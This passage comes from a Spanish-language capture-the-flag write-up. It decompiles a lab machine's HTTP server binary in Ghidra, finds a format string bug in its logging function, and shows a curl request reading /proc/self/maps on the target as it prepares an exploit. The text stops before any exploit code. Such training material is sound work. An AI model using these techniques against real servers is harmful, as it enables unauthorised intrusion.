<span class="mtk7">source</span><span class="mtk1"> /home/john/.bashrc</span>  
<span class="mtk5">while</span><span class="mtk1"> </span><span class="mtk7">true</span><span class="mtk5">;</span>
<span class="mtk5">do</span><span class="mtk1"> </span><span class="mtk7">cd</span><span class="mtk1"> /opt/www</span><span class="mtk5">;</span>
<span class="mtk1">./httpserver</span><span class="mtk5">;</span>
<span class="mtk5">done</span>
</code></pre></div><h3 id="analizando-el-binario-httpserver">Analizando el binario <code>httpserver</code></h3><p>Para analizar el binario, podemos usar Ghidra y ver el c贸digo en C descompilado. Esta es la funci贸n <code>main</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">param_1</span><span class="mtk1">, </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">param_2</span><span class="mtk1">) {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> iVar1;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> iVar2;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> in_GS_OFFSET;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">socklen_t</span><span class="mtk1"> local_140;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> local_13c;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">local_138;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> local_134;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> local_130;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> local_12c;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> local_128;</span>
<span class="mtk1">  sockaddr local_124;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> local_114[</span><span class="mtk6">256</span><span class="mtk1">];</span>
<span class="mtk1">  undefined4 local_14;</span>
<span class="mtk1">  undefined4 </span><span class="mtk5">*</span><span class="mtk1">puStack16;</span>
<span class="mtk1">  </span>
<span class="mtk1">  iVar1 </span><span class="mtk5">=</span><span class="mtk1"> param_2;</span>
<span class="mtk1">  iVar2 </span><span class="mtk5">=</span><span class="mtk1"> param_1;</span>
<span class="mtk1">  puStack16 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk1">param_1;</span>
<span class="mtk1">  local_14 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(undefined4 </span><span class="mtk5">*</span><span class="mtk1">) (in_GS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">14</span><span class="mtk1">);</span>
<span class="mtk1">  local_13c </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">9999</span><span class="mtk1">;</span>
<span class="mtk1">  local_138 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">getcwd</span><span class="mtk1">(local_114, </span><span class="mtk5">0x</span><span class="mtk6">100</span><span class="mtk1">);</span>
<span class="mtk1">  local_140 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">;</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (iVar2 </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> ((</span><span class="mtk5">**</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">**</span><span class="mtk1">) (iVar1 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">) </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk4">'0'</span><span class="mtk1">) </span><span class="mtk5">||</span><span class="mtk1"> (</span><span class="mtk4">'9'</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk5">**</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">**</span><span class="mtk1">) (iVar1 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">))) {</span>  
<span class="mtk1">      local_138 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">**</span><span class="mtk1">) (iVar1 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">);</span>
<span class="mtk1">      iVar2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">chdir</span><span class="mtk1">(</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">**</span><span class="mtk1">) (iVar1 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">));</span>

<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (iVar2 </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk8">perror</span><span class="mtk1">(</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">**</span><span class="mtk1">) (iVar1 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">));</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">        </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">      }</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">      local_13c </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">atoi</span><span class="mtk1">(</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">**</span><span class="mtk1">) (iVar1 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">));</span>
<span class="mtk1">    }</span>
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> (iVar2 </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">3</span><span class="mtk1">) {</span>
<span class="mtk1">    local_13c </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">atoi</span><span class="mtk1">(</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">**</span><span class="mtk1">) (iVar1 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">));</span>
<span class="mtk1">    local_138 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">**</span><span class="mtk1">) (iVar1 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">);</span>
<span class="mtk1">    iVar2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">chdir</span><span class="mtk1">(</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">**</span><span class="mtk1">) (iVar1 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">));</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (iVar2 </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk8">perror</span><span class="mtk1">(</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">**</span><span class="mtk1">) (iVar1 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">));</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">      </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>
<span class="mtk1">  }</span>

<span class="mtk1">  local_134 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">open_listenfd</span><span class="mtk1">(local_13c);</span>
<span class="mtk1">  local_130 </span><span class="mtk5">=</span><span class="mtk1"> local_134;</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk6">0</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> local_134) {</span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"listen on port </span><span class="mtk6">%d</span><span class="mtk4">, fd is </span><span class="mtk6">%d\n</span><span class="mtk4">"</span><span class="mtk1">, local_13c, local_134);</span>
<span class="mtk1">    </span><span class="mtk8">signal</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">d</span><span class="mtk1">, (</span><span class="mtk7 mtki">__sighandler_t</span><span class="mtk1">) </span><span class="mtk5">0x</span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">signal</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">11</span><span class="mtk1">, (</span><span class="mtk7 mtki">__sighandler_t</span><span class="mtk1">) </span><span class="mtk5">0x</span><span class="mtk6">1</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk5">do</span><span class="mtk1"> {</span>
<span class="mtk1">        local_12c </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">accept</span><span class="mtk1">(local_134, </span><span class="mtk5">&amp;</span><span class="mtk1">local_124, </span><span class="mtk5">&amp;</span><span class="mtk1">local_140);</span>
<span class="mtk1">      } </span><span class="mtk5">while</span><span class="mtk1"> (local_12c </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">);</span>

<span class="mtk1">      local_128 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">process</span><span class="mtk1">(local_12c, </span><span class="mtk5">&amp;</span><span class="mtk1">local_124);</span>
<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (local_128 </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">      </span><span class="mtk8">close</span><span class="mtk1">(local_12c);</span>
<span class="mtk1">    }</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">    </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk8">perror</span><span class="mtk1">(</span><span class="mtk4">"ERROR"</span><span class="mtk1">);</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">  </span><span class="mtk8">exit</span><span class="mtk1">(local_134);</span>
<span class="mtk1">}</span>
</code></pre></div><p>B谩sicamente, inicia un servidor de <em>sockets</em> en el puerto 9999 y espera por conexiones. En cuanto llega una conexi贸n, se pasa a la funci贸n <code>process</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">undefined4 </span><span class="mtk8">process</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">param_1</span><span class="mtk1">, undefined4 </span><span class="mtk9 mtki">param_2</span><span class="mtk1">) {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">__pid_t</span><span class="mtk1"> _Var1;</span>
<span class="mtk1">  undefined4 uVar2;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> __fd;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> in_GS_OFFSET;</span>
<span class="mtk1">  undefined4 local_884;</span>
<span class="mtk1">  stat local_870;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> local_818[</span><span class="mtk6">2048</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> local_18;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> local_14;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> local_10;</span>

<span class="mtk1">  local_10 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_GS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">14</span><span class="mtk1">);</span>
<span class="mtk1">  _Var1 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">fork</span><span class="mtk1">();</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (_Var1 </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (param_1 </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">      uVar2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">      _Var1 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">getpid</span><span class="mtk1">();</span>
<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"accept request, fd is </span><span class="mtk6">%d</span><span class="mtk4">, pid is </span><span class="mtk6">%d\n</span><span class="mtk4">"</span><span class="mtk1">, param_1, _Var1);</span>  
<span class="mtk1">      </span><span class="mtk8">parse_request</span><span class="mtk1">(param_1, local_818);</span>
<span class="mtk1">      local_884 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">200</span><span class="mtk1">;</span>
<span class="mtk1">      __fd </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">open</span><span class="mtk1">(local_818, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>

<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (__fd </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) {</span>
<span class="mtk1">        local_884 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">194</span><span class="mtk1">;</span>
<span class="mtk1">        </span><span class="mtk8">client_error</span><span class="mtk1">(param_1, </span><span class="mtk5">0x</span><span class="mtk6">194</span><span class="mtk1">, </span><span class="mtk4">"Not found"</span><span class="mtk1">, </span><span class="mtk4">"File not found"</span><span class="mtk1">);</span>
<span class="mtk1">      } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk8">fstat</span><span class="mtk1">(__fd, </span><span class="mtk5">&amp;</span><span class="mtk1">local_870);</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> ((local_870.st_mode </span><span class="mtk5">&amp;</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">f000</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">8000</span><span class="mtk1">) {</span>
<span class="mtk1">          </span><span class="mtk5">if</span><span class="mtk1"> (local_14 </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">            local_14 </span><span class="mtk5">=</span><span class="mtk1"> local_870.st_size;</span>
<span class="mtk1">          }</span>

<span class="mtk1">          </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk6">0</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> local_18) {</span>
<span class="mtk1">            local_884 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">ce</span><span class="mtk1">;</span>
<span class="mtk1">          }</span>

<span class="mtk1">          </span><span class="mtk8">serve_static</span><span class="mtk1">(param_1, __fd, local_818, local_870.st_size);</span>
<span class="mtk1">        } </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> ((local_870.st_mode </span><span class="mtk5">&amp;</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">f000</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">4000</span><span class="mtk1">) {</span>
<span class="mtk1">          local_884 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">200</span><span class="mtk1">;</span>
<span class="mtk1">          </span><span class="mtk8">handle_directory_request</span><span class="mtk1">(param_1, __fd, local_818);</span>
<span class="mtk1">        } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">          local_884 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">400</span><span class="mtk1">;</span>
<span class="mtk1">          </span><span class="mtk8">client_error</span><span class="mtk1">(param_1, </span><span class="mtk6">400</span><span class="mtk1">, </span><span class="mtk4">"Error"</span><span class="mtk1">, </span><span class="mtk4">"Unknow Error"</span><span class="mtk1">);</span>
<span class="mtk1">        }</span>

<span class="mtk1">        </span><span class="mtk8">close</span><span class="mtk1">(__fd);</span>
<span class="mtk1">      }</span>

<span class="mtk1">      </span><span class="mtk8">log_access</span><span class="mtk1">(local_884, param_2, local_818);</span>
<span class="mtk1">      uVar2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">    uVar2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (local_10 </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_GS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">14</span><span class="mtk1">)) {</span>
<span class="mtk1">    uVar2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">__stack_chk_fail_local</span><span class="mtk1">();</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> uVar2;</span>
<span class="mtk1">}</span>
</code></pre></div><p>Aqu铆 podemos ver algunas funciones interesantes: <code>parse_request</code>, <code>client_error</code>, <code>serve_static</code>, <code>handle_directory_request</code> y <code>log_access</code>. Vamos a mirar esta 煤ltima:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">log_access</span><span class="mtk1">(undefined4 </span><span class="mtk9 mtki">param_1</span><span class="mtk1">, </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">param_2</span><span class="mtk1">, </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">param_3</span><span class="mtk1">) {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> iVar1;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">uint16_t</span><span class="mtk1"> uVar2;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">pcVar3;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> in_GS_OFFSET;</span>
<span class="mtk1">  </span>
<span class="mtk1">  iVar1 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_GS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">14</span><span class="mtk1">);</span>
<span class="mtk1">  uVar2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">ntohs</span><span class="mtk1">(</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">uint16_t</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (param_2 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">));</span>
<span class="mtk1">  pcVar3 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">inet_ntoa</span><span class="mtk1">((in_addr) ((in_addr </span><span class="mtk5">*</span><span class="mtk1">) (param_2 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">))-&gt;s_addr);</span>  
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%s</span><span class="mtk4">:</span><span class="mtk6">%d</span><span class="mtk4"> </span><span class="mtk6">%d</span><span class="mtk4"> - "</span><span class="mtk1">, pcVar3, (</span><span class="mtk7 mtki">uint</span><span class="mtk1">) uVar2,param_1);</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(param_3);</span>
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">""</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"request method:"</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(param_3 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">400</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (iVar1 </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_GS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">14</span><span class="mtk1">)) {</span>
<span class="mtk1">    </span><span class="mtk8">__stack_chk_fail_local</span><span class="mtk1">();</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>驴Puedes verla? Digo, la vulnerabilidad. Esta funci贸n tiene una vulnerabilidad de <em>Format String</em>, ya que <code>param_3</code> se pasa como primer argumento a <code>printf</code>. Esta variable <code>param_3</code> es la variable <code>local_818</code> de la funci贸n <code>process</code>, la cual contiene la URI pedida al servidor. Por tanto, podemos controlar esta variable y explotar la vulnerabilidad.</p><h3 id="preparaci贸n-del-_exploit_">Preparaci贸n del <em>exploit</em></h3><p>Para ello, vamos a ejecutar <code>httpserver</code> en local. Ser铆a bueno descargar la librer铆a Glibc y el <em>loader</em> de la m谩quina remota, pero el servidor no muestra el cuerpo de respuesta al solicitar <code>/proc/self/maps</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.10.148:9999//proc/self/maps -vso -
*   Trying 10.10.10.148:9999...
* Connected to 10.10.10.148 (10.10.10.148) port 9999 (#0)  
&gt; GET //proc/self/maps HTTP/1.1
&gt; Host: 10.10.10.148:9999
&gt; User-Agent: curl/7.84.0
&gt; Accept: */*
&gt;
* Mark bundle as not supporting multiuse
&lt; HTTP/1.1 200 OK
&lt; Accept-Ranges: bytes
&lt; Cache-Control: no-cache
&lt; Content-length: 0
&lt; Content-type: text/plain
&lt;
* Connection #0 to host 10.10.10.148 left intact
</code></pre></div><p>Vamos a mirar la funci贸n <code>parse_request</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">parse_request</span><span class="mtk1">(undefined4 </span><span class="mtk9 mtki">param_1</span><span class="mtk1">, </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">param_2</span><span class="mtk1">) {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> sVar1;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> in_GS_OFFSET;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">local_1028;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> local_1024;</span>
<span class="mtk1">  undefined local_101c[</span><span class="mtk6">1036</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> local_c10;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> local_c0f;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> local_c0e;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> local_810[</span><span class="mtk6">1024</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> local_410;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> acStack1039[</span><span class="mtk6">1023</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> local_10;</span>
<span class="mtk1">  </span>
<span class="mtk1">  local_10 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_GS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">14</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk5">*</span><span class="mtk1">(undefined4 </span><span class="mtk5">*</span><span class="mtk1">) (param_2 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">800</span><span class="mtk1">) </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  </span><span class="mtk5">*</span><span class="mtk1">(undefined4 </span><span class="mtk5">*</span><span class="mtk1">) (param_2 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">804</span><span class="mtk1">) </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  </span><span class="mtk8">rio_readinitb</span><span class="mtk1">(local_101c, param_1);</span>
<span class="mtk1">  </span><span class="mtk8">rio_readlineb</span><span class="mtk1">(local_101c, </span><span class="mtk5">&amp;</span><span class="mtk1">local_c10, </span><span class="mtk5">0x</span><span class="mtk6">400</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">__isoc99_sscanf</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">local_c10, </span><span class="mtk4">"</span><span class="mtk6">%s</span><span class="mtk4"> </span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">, local_810, </span><span class="mtk5">&amp;</span><span class="mtk1">local_410);</span>

<span class="mtk1">  </span><span class="mtk5">while</span><span class="mtk1"> ((local_c10 </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> (local_c0f </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">))) {</span>
<span class="mtk1">    </span><span class="mtk8">rio_readlineb</span><span class="mtk1">(local_101c, </span><span class="mtk5">&amp;</span><span class="mtk1">local_c10, </span><span class="mtk5">0x</span><span class="mtk6">400</span><span class="mtk1">);</span>

